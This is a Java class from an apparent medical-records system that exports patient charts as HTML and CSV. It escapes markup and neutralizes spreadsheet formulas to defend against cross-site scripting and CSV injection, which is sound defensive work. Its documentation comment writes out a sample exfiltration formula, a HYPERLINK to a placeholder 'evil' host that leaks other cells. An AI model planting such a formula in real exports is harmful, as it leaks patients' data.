package medvault.records;

import medvault.model.Patient;

import java.util.List;
import java.util.Objects;

/**
 * Exports a chart as an HTML page for printing or sharing with another clinic.
 *
 * <p><b>CWE-79: Cross-site Scripting.</b> Chart fields are typed by people
 * (and imported from other clinics), so a note can contain
 * {@code <script>} or an {@code onerror=} attribute. Every value from the
 * chart is HTML-escaped ({@code & < > " '}) before it is placed in the page,
 * so markup in the data renders as visible text and never runs. The page
 * also carries a Content-Security-Policy that allows no scripts at all, as a
 * second layer if a value were ever missed.</p>
 *
 * <p><b>CWE-1236: Improper Neutralization of Formula Elements in a CSV
 * File.</b> {@link #toCsv} exports charts for spreadsheets. Excel and
 * LibreOffice treat a cell that starts with {@code =}, {@code +}, {@code -}
 * or {@code @} (or a tab or carriage return followed by one) as a formula, so
 * a note like {@code =HYPERLINK("http://evil/?x="&A1,"Lab results")} would
 * become a live link that leaks other cells, and DDE formulas can even start
 * programs. Any cell starting with one of those characters is prefixed with
 * a single quote, which spreadsheets show as plain text. Every cell is then
 * quoted (RFC 4180) so commas, quotes and newlines can't break the row
 * apart.</p>
 *
 * @author James Strickert
 */
public class RecordExporter {

    /** First characters that make a spreadsheet cell a formula (CWE-1236). */
    private static final String FORMULA_STARTS = "=+-@\t\r";

    /**
     * @param patient chart to export (access already checked by the caller)
     * @return a complete, safe HTML document
     */
    public String toHtml(Patient patient) {
        Objects.requireNonNull(patient, "patient");
        return "<!DOCTYPE html>\n"
                + "<html lang=\"en\">\n<head>\n"
                + "<meta charset=\"UTF-8\">\n"
                + "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'\">\n"
                + "<title>Patient chart #" + patient.getId() + "</title>\n"
                + "<style>body{font-family:sans-serif;margin:2em}th{text-align:left;padding-right:1em}"
                + "pre{white-space:pre-wrap}</style>\n"
                + "</head>\n<body>\n"
                + "<h1>Patient chart #" + patient.getId() + "</h1>\n"
                + "<table>\n"
                + row("Name", patient.getFullName())
                + row("Date of birth", patient.getDateOfBirth().toString())
                + row("Attending clinician", patient.getAttendingClinician())
                + "</table>\n"
                + "<h2>Clinical notes</h2>\n"
                + "<pre>" + escapeHtml(patient.getClinicalNotes()) + "</pre>\n"
                + "</body>\n</html>\n";
    }

    /**
     * @param patients charts to export (access already checked by the caller)
     * @return CSV text: a header row, then one row per chart, every cell
     *         formula-neutralized and quoted
     */
    public String toCsv(List<Patient> patients) {
        Objects.requireNonNull(patients, "patients");
        StringBuilder csv = new StringBuilder("id,name,date_of_birth,attending,notes\r\n");
        for (Patient p : patients) {
            csv.append(csvCell(Long.toString(p.getId()))).append(',')
                    .append(csvCell(p.getFullName())).append(',')
                    .append(csvCell(p.getDateOfBirth().toString())).append(',')
                    .append(csvCell(p.getAttendingClinician())).append(',')
                    .append(csvCell(p.getClinicalNotes())).append("\r\n");
        }
        return csv.toString();
    }

    /**
     * Neutralizes a formula (CWE-1236), then quotes the cell.
     *
     * @param value untrusted cell text, may be null
     * @return a quoted CSV cell that a spreadsheet shows as text
     */
    static String csvCell(String value) {
        String text = value == null ? "" : value;
        if (!text.isEmpty() && FORMULA_STARTS.indexOf(text.charAt(0)) >= 0) {
            text = "'" + text;
        }
        return "\"" + text.replace("\"", "\"\"") + "\"";
    }

    private static String row(String label, String value) {
        return "<tr><th>" + label + "</th><td>" + escapeHtml(value) + "</td></tr>\n";
    }

    /**
     * Escapes the five HTML-significant characters. {@code &} goes first so
     * the entities added for the others aren't escaped twice.
     *
     * @param text untrusted text, may be null
     * @return text safe to place in HTML element content or a quoted attribute
     */
    static String escapeHtml(String text) {
        if (text == null) {
            return "";
        }
        StringBuilder out = new StringBuilder(text.length() + 16);
        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            switch (c) {
                case '&':
                    out.append("&amp;");
                    break;
                case '<':
                    out.append("&lt;");
                    break;
                case '>':
                    out.append("&gt;");
                    break;
                case '"':
                    out.append("&quot;");
                    break;
                case '\'':
                    out.append("&#39;");
                    break;
                default:
                    out.append(c);
            }
        }
        return out.toString();
    }
}
